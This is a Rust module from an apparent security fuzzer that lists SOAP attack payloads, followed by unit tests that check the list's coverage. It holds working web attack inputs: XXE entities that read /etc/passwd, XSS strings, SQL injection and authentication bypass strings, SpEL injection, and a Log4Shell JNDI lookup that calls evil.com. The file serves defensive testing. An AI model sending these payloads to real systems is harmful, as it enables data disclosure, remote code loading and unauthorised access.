use crate::fuzzer::payloads::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    vec![
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP XXE - file read".to_string(),
            severity: Severity::Critical,
            tags: vec!["soap".to_string(), "xxe".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test><![CDATA[<script>alert(1)</script>]]></test></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP XSS - CDATA bypass".to_string(),
            severity: Severity::High,
            tags: vec!["soap".to_string(), "xss".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"><wsse:UsernameToken><wsse:Username>admin</wsse:Username><wsse:Password>admin</wsse:Password></wsse:UsernameToken></wsse:Security></soap:Header><soap:Body></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP WS-Security bypass".to_string(),
            severity: Severity::High,
            tags: vec!["soap".to_string(), "auth".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test>';alert(String.fromCharCode(88,83,83));//</test></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP XSS - quote bypass".to_string(),
            severity: Severity::High,
            tags: vec!["soap".to_string(), "xss".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test><img src=x onerror=alert(1)></test></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP XSS - img error".to_string(),
            severity: Severity::High,
            tags: vec!["soap".to_string(), "xss".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test></test><soap:Body><![CDATA[admin]]></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP body manipulation".to_string(),
            severity: Severity::High,
            tags: vec!["soap".to_string(), "manipulation".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><GetUser><UserId>1' OR '1'='1</UserId></GetUser></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP SQL injection".to_string(),
            severity: Severity::Critical,
            tags: vec!["soap".to_string(), "sqli".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><GetUser><UserId>1 UNION SELECT * FROM users--</UserId></GetUser></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP SQL injection UNION".to_string(),
            severity: Severity::Critical,
            tags: vec!["soap".to_string(), "sqli".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><GetUser><UserId>admin</UserId><Password>' OR '1'='1</Password></GetUser></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP authentication bypass".to_string(),
            severity: Severity::Critical,
            tags: vec!["soap".to_string(), "auth-bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><GetUser><UserId>admin</UserId></GetUser><soap:Body><GetUser><UserId>admin2</UserId></GetUser></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP duplicate body injection".to_string(),
            severity: Severity::High,
            tags: vec!["soap".to_string(), "injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><custom>test</custom></soap:Header></soap:Envelope>"#.to_string(),
            description: "SOAP custom header injection".to_string(),
            severity: Severity::Medium,
            tags: vec!["soap".to_string(), "header".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body>&xxe;</soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP parameter entity XXE".to_string(),
            severity: Severity::Critical,
            tags: vec!["soap".to_string(), "xxe".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:nil="true"/></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP XML external entity nil".to_string(),
            severity: Severity::Medium,
            tags: vec!["soap".to_string(), "test".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns1:getUserInfo xmlns:ns1="http://evil.com/"><id>1</id></ns1:getUserInfo></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP namespace manipulation".to_string(),
            severity: Severity::Medium,
            tags: vec!["soap".to_string(), "namespace".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test>${7*7}</test></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP expression language injection".to_string(),
            severity: Severity::High,
            tags: vec!["soap".to_string(), "el-injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test>#{request.getParameter('test')}</test></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP SPEL injection".to_string(),
            severity: Severity::Critical,
            tags: vec!["soap".to_string(), "spel".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><GetUser><UserId>${jndi:ldap://evil.com/a}</UserId></GetUser></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP Log4Shell JNDI injection".to_string(),
            severity: Severity::Critical,
            tags: vec!["soap".to_string(), "jndi".to_string(), "log4shell".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test><![CDATA[]]]]><![CDATA[>]]></test></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP XML comment injection".to_string(),
            severity: Severity::Medium,
            tags: vec!["soap".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><test>&lt;script&gt;alert(1)&lt;/script&gt;</test></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP encoded XSS".to_string(),
            severity: Severity::High,
            tags: vec!["soap".to_string(), "xss".to_string()],
        },
        Payload {
            payload_type: PayloadType::Soap,
            payload: r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><GetUser><UserId>test" onload="alert(1)</UserId></GetUser></soap:Body></soap:Envelope>"#.to_string(),
            description: "SOAP attribute XSS".to_string(),
            severity: Severity::High,
            tags: vec!["soap".to_string(), "xss".to_string()],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_payloads_returns_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_get_payloads_count_reasonable() {
        let payloads = get_payloads();
        assert!(payloads.len() > 0);
        assert!(payloads.len() < 10000);
    }

    #[test]
    fn test_payloads_are_non_empty_strings() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(
                !p.payload.is_empty(),
                "Payload is empty: {:?}",
                p.description
            );
        }
    }

    #[test]
    fn test_payloads_contain_expected_patterns() {
        let payloads = get_payloads();
        let has_xxe = payloads.iter().any(|p| p.payload.contains("xxe"));
        let has_xss = payloads.iter().any(|p| p.payload.contains("alert(1)"));
        let has_sqli = payloads.iter().any(|p| p.payload.contains("OR '1'='1"));
        let has_soap_envelope = payloads.iter().all(|p| p.payload.contains("soap:Envelope"));
        assert!(has_xxe, "Missing XXE payload");
        assert!(has_xss, "Missing XSS payload");
        assert!(has_sqli, "Missing SQL injection payload");
        assert!(has_soap_envelope, "Not all payloads contain soap:Envelope");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 15,
            "Must have substantial soap payload coverage, got {}",
            payloads.len()
        );
    }
}
